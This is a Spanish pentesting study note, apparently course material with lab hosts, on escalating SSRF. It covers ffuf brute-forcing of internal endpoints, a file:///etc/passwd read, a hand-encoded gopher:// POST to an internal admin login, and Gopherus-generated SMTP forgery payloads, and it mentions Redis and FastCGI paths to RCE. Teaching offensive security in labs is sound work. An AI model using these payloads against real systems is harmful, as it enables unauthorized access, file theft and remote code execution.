---
tags:
  - Web/Red-Team
  - Pentesting/Explotacion
  - Server-Side/SSRF
Fecha de actualización: 2026-06-22
Nota previa: "[[02 - Identificación de SSRF]]"
Nota siguiente: "[[04 - Blind SSRF]]"
Area: "[[SSRF.base|SSRF]]"
---
---

Confirmada la SSRF y mapeada la red interna, el objetivo es **aumentar el impacto**: alcanzar endpoints que solo escuchan en local, leer ficheros del servidor y —el salto cualitativo— enviar peticiones arbitrarias a servicios internos con `gopher://`.

# Acceder a endpoints restringidos

Un host o endpoint interno puede ser inaccesible desde fuera pero alcanzable a través de la SSRF. En el ejemplo, `dateserver.htb` devuelve `403 Forbidden` al acceder directamente, pero **sí responde** cuando es el servidor quien lo pide. Desde ahí, enumeramos sus rutas con un *directory brute-force* canalizado por la SSRF —filtrando la página de error por defecto de Apache—:

```shell-session
$ ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt \
    -u http://172.17.0.2/index.php -X POST \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" \
    -fr "Server at dateserver.htb Port 80"
```

```
[Status: 200] FUZZ: admin
[Status: 200] FUZZ: availability
```

<mark style="background: #FF5582A6;">Aparece `/admin.php`</mark>, un endpoint interno que ahora podemos solicitar vía SSRF (`dateserver=http://dateserver.htb/admin.php`) — potencialmente acceso a información de administración que la red perimetral protegía.

# Leer ficheros locales: `file://`

Si el cliente HTTP soporta el esquema (cURL lo hace), cambiarlo a `file://` convierte la SSRF en **lectura de ficheros locales**:

```
dateserver=file:///etc/passwd
```

<mark style="background: #ADCCFFA6;">Esto degrada la SSRF a una [[01 - Local File Inclusion (LFI)|LFI]] de solo lectura</mark>, útil para leer el **código fuente** de la app (y descubrir más endpoints, credenciales y rutas) o claves SSH. Las técnicas de lectura del módulo File Inclusion aplican igual.

# `gopher://` — de `GET` a peticiones arbitrarias

Cuando solo controlamos la URL de destino y el servidor fija el método internamente, quedamos limitados a `GET`: no podemos enviar un `POST` con cuerpo. <mark style="background: #FFB8EBA6;">No es una limitación del esquema `http://`</mark> (cURL hace `POST` de sobra) sino del **punto de inyección** —solo controlamos la URL, no el método—. Estorba cuando el endpoint interno espera un `POST` —por ejemplo, el login de `/admin.php` que recibe la contraseña en `adminpw`—.

<mark style="background: #8000E1A6;">El esquema `gopher://` envía **bytes arbitrarios** a un socket TCP</mark>, así que construimos la petición HTTP a mano. Partimos del `POST` que queremos enviar:

```http
POST /admin.php HTTP/1.1
Host: dateserver.htb
Content-Length: 13
Content-Type: application/x-www-form-urlencoded

adminpw=admin
```

Lo serializamos en una URL gopher: prefijo `gopher://host:puerto/_` y el resto **URL-encodeado** (espacios `%20`, saltos de línea `%0D%0A`):

```url
gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin
```

> [!warning]+ Doble URL-encoding
> Como esta URL gopher viaja **dentro** del parámetro `dateserver` (que ya es `application/x-www-form-urlencoded`), hay que **codificar la URL entera una segunda vez** para que llegue intacta al cliente HTTP. Si no, obtienes un `Malformed URL`. Es el error más común al construir payloads gopher a mano.

El resultado: el endpoint interno acepta el `POST` y entramos al panel. La misma técnica habla con **cualquier servicio TCP**, no solo HTTP.

# `gopher://` contra servicios internos: el alto impacto

Aquí está el verdadero peligro. Con gopher se interactúa con servicios que asumen que solo les habla la red interna y suelen estar **sin autenticar**:

- **Redis** → escribir un cron job o una webshell = **RCE**.
- **FastCGI** (`9000`) → ejecución de PHP = **RCE**.
- **SMTP** (`25`) → enviar correo interno falsificado.
- **MySQL / PostgreSQL** → consultas con el usuario del servicio.

Construir esos payloads a mano es tedioso; la herramienta de referencia es [`Gopherus`](https://github.com/tarunkant/Gopherus), que genera la URL gopher por servicio (`MySQL`, `PostgreSQL`, `FastCGI`, `Redis`, `SMTP`, `Zabbix`, varios `memcache`):

```shell-session
$ python2.7 gopherus.py --exploit smtp
Mail from :  attacker@academy.htb
Mail To :  victim@academy.htb
...
gopher://127.0.0.1:25/_MAIL%20FROM:attacker%40academy.htb%0ARCPT%20To:victim%40academy.htb%0ADATA%0A...
```

<mark style="background: #FFB86CA6;">El salto de "leer una respuesta interna" a "ejecutar comandos vía Redis/FastCGI" es lo que convierte una SSRF en *critical*</mark>. Gopherus depende de **Python 2** (heredado); el detalle del arsenal y alternativas, en [[07 - Arsenal de herramientas SSRF|arsenal]].

> [!info]+ Fuentes
> - [PortSwigger — Exploiting SSRF](https://portswigger.net/web-security/ssrf) · [Gopherus](https://github.com/tarunkant/Gopherus)
> - [HackTricks — SSRF (gopher, schemes)](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery) · [PayloadsAllTheThings — SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)

Todo lo anterior asume que **vemos la respuesta**. Cuando no es así, entramos en el terreno restringido pero explotable de la [[04 - Blind SSRF]].
